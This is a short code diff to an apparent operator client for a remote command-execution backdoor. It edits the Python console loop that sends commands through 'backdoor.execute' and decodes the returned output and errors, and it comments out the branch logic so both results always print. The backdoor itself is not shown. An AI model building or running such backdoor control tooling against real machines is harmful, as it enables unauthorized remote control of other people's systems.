@@ -14,11 +14,12 @@ class Client(cmd.Cmd):
     prompt = '> '
     def do_exec(self, c):
         out, err = backdoor.execute(c)
-        out = codecs.decode(bytes(out['data'],'utf-16be'),out['encoding']))
-        err = codecs.decode(bytes(err['data'],'ascii'),err['encoding']))
-        print('Output:\n%s' % out.decode('utf-8'))
-        if len(err):
-            print('Error:\n%s' % err.decode('utf-8'))
+        out = codecs.decode(bytes(out['data'],'ascii'),out['encoding'])
+        err = codecs.decode(bytes(err['data'],'ascii'),err['encoding'])
+        #if not len(err):
+        print('Error:\n%s' % err.decode('cp1252'))
+        #else : 
+        print('Output:\n%s' % out.decode('cp1252'))
 
 Client().cmdloop()
 #rawcat
